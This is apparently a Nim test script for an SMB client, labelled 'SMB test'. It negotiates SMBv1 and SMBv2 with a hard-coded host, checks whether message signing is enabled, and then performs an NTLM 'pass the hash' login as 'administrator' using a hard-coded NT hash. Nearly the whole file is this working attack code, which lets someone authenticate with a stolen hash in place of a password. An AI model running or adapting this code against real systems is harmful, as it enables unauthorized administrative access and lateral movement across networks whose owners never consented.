#[
    SMB test
]#

#SMB1

import net, strutils, SMBv1, SMBv2

proc recvPacket(sock: Socket, bufSize, timeout: int): seq[string] =
    var buf: string
    try:
        while sock.recv(buf, 1, timeout) > 0:
            result.add(buf.toHex())
    except:
        discard

proc recvPacketForNTLM(sock: Socket, bufSize, timeout: int): string =
    var buf: string
    try:
        while sock.recv(buf, 1, timeout) > 0:
            result.add(buf)
    except:
        discard

proc checkSigning(data: seq[string]): bool =
    if data[70] == "01":
        result = true 

proc checkDialect(data: seq[string]): string =
    if data[4..7] == @["FF", "53", "4D", "42"]:
        result = "SMB1"
    else:
        result = "SMB2"

let sock = newSocket()
var 
    recvClient: seq[string]
    signing: bool
    response: string

## Connect
sock.connect("192.168.1.22", 445.Port)

## SMBv1 Init negotiate
sock.send(getSMBv1NegoPacket())
recvClient = sock.recvPacket(1024, 100)

## Check Dialect
echo "Dialect: ", checkDialect recvClient

## Check Signing
signing = checkSigning recvClient
if signing:
    echo "Signing Enabled"
else:
    echo "Signing Disabled"

## SMBv2 negotiate
sock.send(getSMBv2NegoPacket())
recvClient = sock.recvPacket(1024, 100)

## SMBv2NTLM negotiate
sock.send(getSMBv2NTLMNego(signing))
response = sock.recvPacketForNTLM(1024, 100)
echo response.len()
## Pass the hash
let 
    user = "administrator"
    hash = "47bf8039a8506cd67c524a03ff84ba4e"
    domain = "."
    authPacket = getSMBv2NTLMAuth(getSMBv2NTLMSSP(response, hash, domain, user, signing)) 
sock.send(authPacket)
recvClient = sock.recvPacket(1024, 100)
sock.close()